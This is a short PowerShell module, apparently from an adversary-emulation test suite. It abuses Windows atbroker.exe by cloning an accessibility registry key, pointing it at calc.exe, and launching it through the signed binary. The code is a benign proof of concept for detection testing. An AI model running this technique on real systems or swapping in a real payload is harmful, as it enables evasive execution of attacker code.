<# 
    .Synopsis
    Atbroker.exe abuse to launch malicious process

    .Description
    https://lolbas-project.github.io/lolbas/Binaries/Atbroker/
#>

function Write-Log {
    Param(
    [Parameter(Mandatory=$True)]
    [string] $Message
    )

    # Log file location
    $logfile = $PSScriptRoot + "\logs\atbroker.log"

    $Stamp = (Get-Date).toString("yyyy/MM/dd HH:mm:ss")
    $Line = "$Stamp $Message"
    Add-Content $logfile -Value $Line
}

function Start-TechniqueOne {
    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $lolbinpath
    )
    # Store output of commands
    $logged_content = ""

    # Clone an existing AT broker:
    Copy-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\osk\' -Destination 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware' -Recurse

    # Modify keys to launch malware
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware' -Name 'ATExe' -value 'calc.exe'
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware' -Name 'StartExe' -value '%SystemRoot%\System32\calc.exe'

    # Start malicious binary
    Write-Log("Starting: Technique 1")
    $logged_content += & $lolbinpath /start malware
    Write-Log($logged_content)
}

function Start-Atbroker {

    if (Test-Path 'c:\windows\system32\atbroker.exe') {
        $lolbinpath = 'c:\windows\system32\atbroker.exe'
    }
    else {
        return
    }

    Start-TechniqueOne($lolbinpath)
}
Export-ModuleMember -Function Start-Atbroker